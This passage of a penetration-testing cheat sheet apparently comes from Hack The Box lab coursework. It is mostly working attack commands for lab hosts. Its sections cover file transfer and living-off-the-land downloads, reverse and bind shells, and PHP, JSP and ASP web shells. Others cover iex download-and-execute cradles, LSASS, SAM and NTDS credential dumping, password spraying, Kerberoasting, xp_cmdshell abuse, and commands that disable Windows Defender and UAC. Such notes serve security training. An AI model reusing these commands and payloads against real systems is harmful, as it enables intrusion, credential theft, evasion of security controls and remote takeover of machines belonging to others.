A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
OR A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
V> cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
##### PowerShell Session File Transfer
```
client> Test-NetConnection -ComputerName DATABASE01 -Port 5985
OR 
client> $Session = New-PSSession -ComputerName DATABASE01
client> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Server> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
##### RDP
```
A> rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
OR A> xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
V> \\tsclient\

V> After selecting the drive, we can interact with it in the remote session that follows.
<img width="1155" height="822" alt="image" src="https://github.com/user-attachments/assets/2b0efc0c-b6ad-4ce8-b49b-2ba72be8a1bb" />

```
### Protected File Transfers
##### File Encryption on Windows
```
by using https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
.then > Import-Module .\Invoke-AESEncryption.ps1
.then > Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
##### File Encryption on Linux
```
# Encrypting
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

```
### Catching Files over HTTP/S
```
## Nginx - Enabling PUT
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
sudo vim /etc/nginx/sites-available/upload.conf
``
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
``
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
tail -2 /var/log/nginx/error.log
ss -lnpt | grep 80
ps -ef | grep 2811
sudo rm /etc/nginx/sites-enabled/default
Testing uploading --> curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```
### Living off The Land
```
# LOLBAS
# To search for download and upload functions in LOLBAS we can use /download or /upload.
# Upload win.ini to our Pwnbox
A> sudo nc -lvnp 8000
V> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

# GTFOBins
A> openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
A> openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
V> openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

# Other Common Living off the Land tools
## Bitsadmin Download function
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
bitsadmin /transfer myJob /download /priority high http://10.10.16.33:8000/bb.txt C:\Users\htb-student\Desktop\bb.txt
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# Certutil
Download a File with Certutil
certutil -urlcache -split -f http://10.10.10.32/nc.exe 
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

# Transferring File with GfxDownloadWrapper.exe
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

# otheres
## WinHttpRequest - Client
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText

## Msxml2 - Client
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText

## BITS - Client
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r



```
## Shells

##### Reverse Shell
```
# bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
# powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
# for disable antivurs to run reverse sheel --> Set-MpPreference -DisableRealtimeMonitoring $true
# from our device $ nc -lvnp 1234
# Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
```
##### Bind Shell
```
# V> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
OR
# V> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
# A> nc -nv 10.129.41.200 7777
# python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
# powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
# from our device, we will try to access the target machine through $nc 10.10.10.1 1234
# Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
```
##### Web Shell
```
# php --> <?php system($_REQUEST["cmd"]); ?>
# php --> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
# jsp --> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
# asp --> <% eval request("cmd") %>
```
##### Updating TTY 
```
# python -c 'import pty; pty.spawn("/bin/bash")'
# bash /bin/sh -i
# perl perl —e 'exec "/bin/sh";'
# perl perl: exec "/bin/sh";
# ruby ruby: exec "/bin/sh"
# lua lua: os.execute('/bin/sh')
# awk awk 'BEGIN {system("/bin/sh")}'
# find find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
# exec find . -exec /bin/sh \; -quit
# vim vim -c ':!/bin/sh'
# vim escap -->
 vim
:set shell=/bin/sh
:shell
```
## Password Attacks
##### Password Mutations
```
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

##### Remote Password Attacks
```
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>

# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <ip> -u <username> -p <password> --ntds
```
##### Windows Password Attacks
```
# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
Get-Process lsass

# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.
pypykatz lsa minidump /path/to/lsassdumpfile

# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save

# Uses move in Windows to transfer a file to a specified file share over the network.
move sam.save \\<ip>\NameofFileShare

# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
##### Linux Password Attacks
```
# Script that can be used to find .conf, .config and .cnf files on a Linux system.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Script that can be used to find credentials in specified file types.
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Script that can be used to find common database files.
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

# Uses Linux-based find command to search for text files.
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```
##### Cracking Passwords
```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash
```
## Attacking Common Services

##### Attacking SMB

```
# Network share enumeration using smbmap.
smbmap -H 10.129.14.128

# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```
##### Attacking SQL
```
# SQLEXPRESS
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'

# Hash stealing using the xp_dirtree command in MSSQL.
EXEC master..xp_dirtree '\\10.10.110.17\share\'

# Hash stealing using the xp_subdirs command in MSSQL.
EXEC master..xp_subdirs '\\10.10.110.17\share\'

# Identify the user and its privileges used for the remote connection in MSSQL.
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
##### Attacking Email Services
```
# DNS lookup for mail servers for the specified domain
host -t MX microsoft.com

#  DNS lookup for mail servers for the specified domain
dig mx inlanefreight.com | grep "MX" | grep -v ";"

#  DNS lookup of the IPv4 address for the specified subdomain.
host -t A mail1.inlanefreight.htb.

# Connect to the SMTP server.
telnet 10.10.110.20 25

# SMTP user enumeration using the RCPT command against the specified host
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# Brute-forcing the POP3 service.
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

# Testing the SMTP service for the open-relay vulnerability.
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```
## Active Directory

#### Initial Enumeration
```
# Responder 
sudo responder -I ens224 -A

# Inveigh
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
OR 
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES

# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```
##### LLMNR Poisoning
```
# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
##### Password Spraying and Password Policies
```
# Uses CME to extract  password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Using enum4linux
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# Using Enumerating Null Session - from Windows | see the differenct responses for differnet usernames.
net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "password" /u:guest
net use \\DC01\ipc$ "password" /u:guest

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
import-module .\PowerView.ps1
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Using enum4linux to impelment null session to extract users
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" 

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users
OR
# crackmapexec to check the valid credintails for  Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Using Rpcclient a Bash one-liner for the Attack.
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
##### [Enumerating Disabling/Bypassing Security Controls](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
```
# Checking the Status of Defender with Get-MpComputerStatus
Get-MpComputerStatus

# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Checking PowerShell Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# Checking LAPs
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```
##### Credentialed Enumeration - from Linux and Windows
```
# Credentialed Enumeration - from Linux

## crackmapexec - Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

## crackmapexec - Domain Group Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

## crackmapexec - CME - Logged On Users and shares
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

## Using sql map
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

## Using rpcclient
rpcclient -U "" -N 172.16.5.5
queryuser 0x457
enumdomusers

## impacket 
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

## Windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

## Bloodhound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
https://academy.hackthebox.com/course/preview/active-directory-bloodhound
https://wadcoms.github.io/

----------------------------------------------------------------------------------------------
# Credentialed Enumeration - from Windows
Import-Module ActiveDirectory
Get-Module
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"

## Powerview
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

## sharpview
\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity forend

## Snaffler - Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

## SharpHound in Action
 .\SharpHound.exe --help
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

##### Living Of The Land
```
# Basic Enumeration Commands
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%

# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
Get-Module
Import-Module ActiveDirectory

Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
Get-host

# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
Get-ADDomain

# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
Get-ADTrust -Filter * | select name

# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
Get-ADGroupMember -Identity "Backup Operators"

---------------------------
# Firewall Checks
netsh advfirewall show allprofiles
sc query windefend
Get-MpComputerStatus

# AmIAlone
qwinsta

# Network Information
arp -a
ipconfig /all
route print
netsh advfirewall show allprofiles

# Windows Management Instrumentation (WMI)
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

## Net Commands
net accounts	Information about password requirements
net accounts /domain	Password and lockout policy
net group /domain	Information about domain groups
net group "Domain Admins" /domain	List users with domain admin privileges
net group "domain computers" /domain	List of PCs connected to the domain
net group "Domain Controllers" /domain	List PC accounts of domains controllers
net group <domain_group_name> /domain	User that belongs to the group
net groups /domain	List of domain groups
net localgroup	All available groups
net localgroup administrators /domain	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup Administrators	Information about a group (admins)
net localgroup administrators [username] /add	Add user to administrators
net share	Check current shares
net user <ACCOUNT_NAME> /domain	Get information about a user within the domain
net user /domain	List all users of the domain
net user %username%	Information about the current user
net use x: \computer\share	Mount the share locally
net view	Get a list of computers
net view /all /domain[:domainname]	Shares on the domains
net view \computer /ALL	List shares of a computer
net view /domain	List of PCs of the domain
((((simple trick try net1 instead of net))))

-----------------------
## Dsquery
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName


https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)

```
##### Kerberoasting
```
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
	impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs

# Enumerating SPNs with setspn.exe
setspn.exe -Q */*

# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes --> checking support encryption types.

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

```

##### ACL Enumeration and Tactics
```
# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1 
$sid = Convert-NameToSid wley

# Using Get-DomainObjectACL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Performing a Reverse Search & Mapping to a GUID Value
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
# Using the -ResolveGUIDs Flag
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
# Creating a List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# forloop
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
# Creating a List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# forloop
